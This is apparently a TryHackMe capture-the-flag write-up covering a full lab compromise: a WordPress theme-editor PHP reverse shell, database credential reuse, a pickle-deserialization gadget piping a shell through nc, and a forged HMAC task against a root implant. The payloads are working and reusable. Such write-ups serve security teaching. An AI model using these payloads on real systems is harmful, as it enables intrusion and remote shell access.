**Room:** [TryHackMe — CTF: Jackpot Overflow](https://tryhackme.com/room/thm-ctf-jackpot-overflow)

_Passwords, cracked hashes, and flags have been omitted from this writeup per TryHackMe's publishing guidelines._

## Description

- [ ] Get a foothold on the web application
- [ ] Escalate to a low-privileged user
- [ ] Escalate to the internal operator account
- [ ] Take back control from what's already inside
- [ ] Submit the flags

---

## Enumeration

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b4:22:96:f2:a4:c1:c6:1c:0a:b5:f9:c4:0c:0a:08:19 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCdmnIKJR3wS2B7ouDGhmWoJfbOk6vS/aPWpmGYpSzEBWL79hQq0RdXQhszYpoEgDdFA+LvK+Mj3h/DZcuCuaX8=
|   256 dd:43:bb:77:9a:38:75:97:e9:81:62:37:27:2b:9f:3e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK24dGt9OVen5Bd6nSGCoq7PuidIrLX2LUuRBF3roTqM
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.58 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: WordPress 6.9
|_http-title: An incorporation of sorts!
|_http-server-header: Apache/2.4.58 (Ubuntu)
```

---

##### WPSCAN

### 1.1 WordPress enumeration

`wpscan` was run against the site to fingerprint the install before looking for a way in.

bash

```bash
wpscan --url http://TARGET/ -e u
```

```
[+] WordPress version 6.9 identified (Insecure, released on 2025-12-02).
[+] WordPress theme in use: twentytwentyfive
[i] User(s) Identified:
[+] heinz
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

This confirmed a valid WordPress username (`heinz`) and the active theme (`twentytwentyfive`), which mattered later for where PHP payloads could actually be executed from.

```bash
wpscan --url http://TARGET/ -e ap --plugins-detection aggressive
```

Plugin/theme enumeration didn't surface anything else immediately notable — the confirmed username was the useful lead here, feeding into credential access on the admin panel.

---

### 2. Foothold — WordPress → PHP Execution → `www-data` (wp2shell)

With valid WordPress admin credentials (using the `heinz` account) and theme/plugin editing enabled in the dashboard, the foothold was achieved via the classic **"wp2shell"** technique — abusing the built-in Theme File Editor to turn admin-level WordPress access into arbitrary PHP execution on the underlying server. This is a well-known post-auth-to-RCE technique against WordPress (not a specific CVE, but a standing feature-abuse pattern): any WordPress admin who can edit theme PHP files can get a shell, because the editor writes directly to disk and WordPress will execute whatever PHP it finds on the next matching request.

A PHP payload was placed via the Theme File Editor.

> Note: on block themes (e.g. Twenty Twenty-Five), files under `templates/*.html` are **not** PHP-executable — they're block templates. `functions.php` is the file that actually gets parsed as PHP on every page load.

```bash
# listener
nc -lvnp 4444
```

- PHP code - monkey

```php
<?php
$ip = 'TARGET';
$port = 4444;

$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', [
    0 => $sock,
    1 => $sock,
    2 => $sock
], $pipes);
?>
```

- Saved into `functions.php`, then triggered by requesting the site:

```bash
curl http://TARGET/
```

- Shell received as `www-data`.

```bash
whoami
id
```

---

## 3. Escalation — `www-data` → `norm`

`wp-config.php` in the WordPress root exposed the database credentials.

```bash
cat wp-config.php | grep DB_
```

- DB Conf

```
DB_NAME     = wordpress
DB_USER     = wpuser
DB_PASSWORD = [omitted]
DB_HOST     = localhost
```

Logging into MariaDB with those credentials revealed a table that doesn't belong to a stock WordPress install:

```bash
mysql -u wpuser -p wordpress
```

- Tables

```sql
show tables;
```

- Output

```
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments            |
| wp_infra_accounts     |  <-- not a default WP table
| wp_links               |
| wp_options             |
| wp_postmeta            |
| wp_posts               |
| wp_term_relationships  |
| wp_term_taxonomy       |
| wp_termmeta            |
| wp_terms               |
| wp_usermeta            |
| wp_users               |
+-----------------------+
```

- wp_infra_accounts

```sql
DESCRIBE wp_infra_accounts;
SELECT * FROM wp_infra_accounts;
```

- Output

```
+-----------+---------------------+---------------------------------------------------+
| host_user | host_pass           | note                                               |
+-----------+---------------------+-----------------------------------------------------+
| norm      | [omitted]           | ssh sync target for the -inator newsletter cron    |
+-----------+---------------------+-----------------------------------------------------+
```

- Used those creds to SSH in directly as `norm`.

```bash
ssh norm@TARGET
```

- Enumeration

```bash
norm@tryhackme-2404:~$ ls
user.txt
norm@tryhackme-2404:~$ cat user.txt
[@Gh0ulH4x]
norm@tryhackme-2404:~$ id
uid=1001(norm) gid=1002(norm) groups=1002(norm),1001(evilinc)
```

**Flag 1 (user):** _submitted on TryHackMe — omitted here_ `sudo -l` came back empty — no sudo rights for `norm`.

---

## 4. Escalation — `norm` → Operator (Blueprint Panel)

### 4.1 Discovering the internal panel

Local enumeration confirmed the loopback service on `8700` was a Flask app run by `vanessa`, managed via systemd:

- Port Listening

```bash
ps -ef | grep -E '[g]unicorn|[p]ython'
```

- `[g]unicorn`

```
vanessa  614  1  0 15:31 ?  00:00:01 /usr/bin/python3 /usr/bin/gunicorn --bind 127.0.0.1:8700 --workers 2 app:app
```

- Service running directory

```bash
cat /etc/systemd/system/evilinc-panel.service
```

- Content

```
[Unit]
Description=Evil Inc. -inator Control Panel (internal, loopback only)
After=network.target

[Service]
User=vanessa
Group=vanessa
WorkingDirectory=/var/www/evilinc-panel
Environment=EIC_PANEL_CONF=/etc/evilinc/panel.conf
ExecStart=/usr/bin/gunicorn --bind 127.0.0.1:8700 --workers 2 app:app
Restart=always
RestartSec=2
```

- The referenced config file was world-readable and contained the panel's operator secret:

```bash
cat /etc/evilinc/panel.conf
```

- Secret

```
[panel]
operator_secret = [omitted]
```

### 4.2 Authenticating to the panel

```bash
curl -i -c cookies.txt \
  -X POST http://127.0.0.1:8700/api/login \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'secret=[omitted]'
```

- Successful

```
HTTP/1.1 200 OK
Set-Cookie: op_token=ce73de7cfa02d80495a882bd28191d3bf38e4c0bf03635451ae6b9f9fefef3f9; HttpOnly; Path=/
{"ok":true}
```

### 4.3 Mapping the blueprint loader

The panel exposed a "blueprint" import/export feature backed by **Python `pickle`**:

```bash
curl -s -b cookies.txt http://127.0.0.1:8700/api/blueprints/export
```

- Output

```
{"blueprint":"gASVRgAAAAAAAAB9lCiMBG5hbWWUjA5Nb250aGx5IERpZ2VzdJSMCHNlY3Rpb25zlF2UKIwFaW50cm+UjAdzY2hlbWVzlIwFb3V0cm+UZXUu"}
```

- Decoded and inspected with `pickletools` to confirm it was a plain `STOP`-terminated dict pickle (protocol 4):

```bash
echo '<base64>' | base64 -d > blueprint.pkl
python3 -m pickletools blueprint.pkl
```

Probing the import endpoint with various stdlib container types (from `collections`) confirmed the loader restricts imports by **module name**, not by class behavior — `builtins` was explicitly blocked, but other modules were not:

```bash
curl -s -b cookies.txt -X POST http://127.0.0.1:8700/api/blueprints/import \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "blueprint=$B64"
```

- Failed

```
{"error":"import failed: blueprint references a blocked module: 'builtins'","ok":false}
```

- Others by `Class`

```
{"loaded":"OrderedDict()","ok":true}
{"loaded":"Counter({'intro': 1})","ok":true}
{"loaded":"deque(['intro', 'outro'])","ok":true}
{"loaded":"ChainMap({'x': 1})","ok":true}
{"loaded":"{'x': 1}","ok":true}          # UserDict
{"loaded":"'x'","ok":true}               # UserString
```

### 4.4 Building the RCE gadget

Since the loader unpickles arbitrary objects from modules outside its blocklist, and unpickling can invoke `__reduce__` on any such object, a gadget was built that calls back into `pickle.loads` itself with a nested payload targeting `os.system` — routed through a module the loader doesn't block.

```bash
curl -b cookies.txt -X POST http://localhost:8700/api/blueprints/import \
  --data-urlencode "blueprint=$(python3 -c "
import pickle,base64
cmd='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 'TARGET' 4444 >/tmp/f'
inner=b\"cos\nsystem\n(S'\" + cmd.encode() + b\"'\ntR.\"
class E:
    def __reduce__(self):
        return(pickle.loads,(inner,))
print(base64.b64encode(pickle.dumps(E())).decode())
")"
```

- Submitted the resulting base64 blueprint against the authenticated import endpoint, catching the reverse shell on a listener:

```bash
nc -lvnp 4444
```

- Shell received as `vanessa`.

```bash
vanessa@tryhackme-2404:~$ id
uid=1002(vanessa) gid=1003(vanessa) groups=1003(vanessa),1001(evilinc)
```

**Flag 2 (operator):** _submitted on TryHackMe — omitted here_

```bash
vanessa@tryhackme-2404:~$ cat Operator.txt
[@Gh0ulH4x]
```

---

## 5. Take Back Control — Reverse-Engineering the Implant

### 5.1 Spotting the beacon

As `vanessa`, further enumeration turned up two root-owned processes with PPID `1` — not part of the panel — and a Unix socket only `vanessa`'s group could reach:

```bash
ps -ef | grep -E '[p]ython'
```

- Running services

```
root  611  1  0 15:31 ?  00:00:01 /usr/bin/python3 /opt/evilinc/c2/tasking_server.py
root  612  1  0 15:31 ?  00:00:00 /usr/bin/python3 /opt/evilinc/c2/heartbeat.py
```

- `Evilinc` - tasking.sock

```bash
ls -l /run/evilinc/tasking.sock
```

- File permissions

```
srw-rw---- 1 root vanessa 0 Aug  9 18:32 /run/evilinc/tasking.sock
```

This is the "something's already inside, holding root" from the briefing — an implant tasking a Unix socket that `vanessa`'s group can talk to.

### 5.2 Static analysis of the implant binary

The implant at `/opt/evilinc/implant` was pulled apart with `objdump`. The `.rodata` section immediately gave up the protocol shape:

```bash
objdump -s -j .rodata /opt/evilinc/implant
```

Key strings recovered:

```
/etc/machine-id
/run/evilinc/tasking.sock
POLL %ld
|%s|%s|%s|%s
exec
sysinfo
```

...and a 32-byte constant sitting right next to them:

```
1588c57c026ae5eb9c2d1817af48f709
64efff765e58d112d8f116d70f9941b4
```

### 5.3 Tracing the task parser

Following the main loop in the disassembly showed tasks are pipe-delimited 5-field strings, tokenized with `strtok_r()`:

```
field1 = task ID
field2 = verb        (e.g. "exec", "sysinfo")
field3 = argument / command
field4 = counter
field5 = HMAC
```

The HMAC is computed over the canonical string `|field1|field2|field3|field4` using `HMAC-SHA256` (confirmed via the `EVP_sha256@plt` / `HMAC@plt` calls). A later `strcmp(field2, "exec")` branch feeds `field3` straight into `system()` — the actual command-execution primitive.

### 5.4 Recovering the key-derivation chain

Two more functions in the binary implemented the key derivation:

- A custom **LCG** (linear congruential generator): `seed = 0x1a2b3c4d`, `state = (state * 0x41c64e6d + 0x3039) mod 2^32`, emitting `(state >> 16) & 0xff` per byte, 32 bytes total.
- The LCG output is **XORed** against the 32-byte `.rodata` constant found above, producing an "outer key".
- The outer key is then used as the HMAC key over the contents of `/etc/machine-id`, producing the **final tasking key**.

```
LCG(seed) --XOR--> .rodata constant --> outer_key
outer_key --HMAC-SHA256(machine-id)--> final tasking key
```

- vanessa machine `ID`

```bash
cat /etc/machine-id
```

- Output

```
ec237b10a5f6e959a3088340f9904b31
```

### 5.5 Key-derivation & validation script

```python
 python3 - <<'PY'
import hmac
import hashlib

key = bytes.fromhex(
    "aa3e4980d20530450df2e4807cddc7a66f8391b79df9faaacde58b75bb483319"
)

message = b"20|sysinfo|uptime|1001"

mac = hmac.new(key, message, hashlib.sha256).hexdigest()

expected = "0f9e75af082404418e7eced42503f98b4a048591a242e7ef73a6627d60c2e54f"

print("Calculated:", mac)
print("Expected:  ", expected)
print("MATCH:     ", mac == expected)
PY
Calculated: 0f9e75af082404418e7eced42503f98b4a048591a242e7ef73a6627d60c2e54f
Expected:   0f9e75af082404418e7eced42503f98b4a048591a242e7ef73a6627d60c2e54f
MATCH:      True
****
```

The derived key was validated by recomputing the HMAC for an existing, legitimately-queued task observed on the socket (`sysinfo|uptime`) and confirming it matched byte-for-byte before trusting the derivation:

```
Calculated: 0f9e75af082404418e7eced42503f98b4a048591a242e7ef73a6627d60c2e54f
Expected:   0f9e75af082404418e7eced42503f98b4a048591a242e7ef73a6627d60c2e54f
MATCH: True
```

### 5.6 Forging an authenticated `exec` task

With the key confirmed, a new task was signed and submitted, using the implant's own `exec` verb to read the root flag out to a readable location.

```python
import hmac, hashlib

def lcg_bytes(n):
    seed = 0x1a2b3c4d
    out = bytearray()
    for _ in range(n):
        seed = (seed * 0x41c64e6d + 0x3039) & 0xFFFFFFFF
        out.append((seed >> 16) & 0xFF)
    return bytes(out)

xor_const = bytes.fromhex("1588c57c026ae5eb9c2d1817af48f70964efff765e58d112d8f116d70f9941b4")

lcg = lcg_bytes(32)
outer_key = bytes(a ^ b for a, b in zip(lcg, xor_const))

machine_id = open("/etc/machine-id").read().strip()
inner_key = hmac.new(outer_key, machine_id.encode(), hashlib.sha256).digest()

def sign(task_id, verb, arg, counter):
    msg = f"{task_id}|{verb}|{arg}|{counter}"
    return hmac.new(inner_key, msg.encode(), hashlib.sha256).hexdigest()

task_id = "7000"
verb = "exec"
arg = "cat /root/root.txt > /tmp/loot 2>&1"
counter = "1"

h = sign(task_id, verb, arg, counter)
line = f"SUBMIT {task_id}|{verb}|{arg}|{counter}|{h}"
print(line)
```

- Run command

```bash
python3 forge_task.py | socat - UNIX-CONNECT:/run/evilinc/tasking.sock
```

- Change Directory - `/tmp`

```bash
cat /tmp/loot
```

**Flag 3 (root):** _submitted on TryHackMe — omitted here_

---

## 6. Summary — Full Attack Chain

```
WordPress admin (theme editor)
        │
        ▼
PHP execution (functions.php) → www-data
        │
        ▼
wp-config.php → MariaDB creds
        │
        ▼
wp_infra_accounts table → norm's SSH creds
        │
        ▼
SSH as norm → user.txt
        │
        ▼
World-readable /etc/evilinc/panel.conf → operator_secret
        │
        ▼
Authenticate to internal blueprint panel (127.0.0.1:8700)
        │
        ▼
Pickle deserialization (module-allowlist bypass) → RCE as vanessa
        │
        ▼
Discover root-owned implant + tasking.sock (group-readable)
        │
        ▼
Static RE of /opt/evilinc/implant → protocol + crypto recovered
        │
        ▼
Forge authenticated "exec" task → system() as root
        │
        ▼
root.txt
```

## Lessons Learned

- **Blocklisting `pickle` by module name is not a safe sandbox.** Any class reachable from an allowed module can still be leveraged if its construction/reduction has side effects — the fix is an explicit allowlist of known-safe types, or dropping `pickle` for untrusted input entirely in favor of JSON.
- **World-readable config files defeat their own secrets.** The operator panel's authentication was only as strong as the permissions on `/etc/evilinc/panel.conf`.
- **"Custom crypto" embedded in a binary is not a secret.** Every input to the implant's key derivation (LCG constants, XOR constant, and the fact that `/etc/machine-id` is world-readable) was recoverable through static analysis — the authentication scheme became a fully reproducible function once the binary was disassembled.
- **Group-readable sockets on root-owned services are a privilege boundary.** `/run/evilinc/tasking.sock` being `root:vanessa` group-owned meant any code execution as `vanessa` had a direct line to root's tasking interface.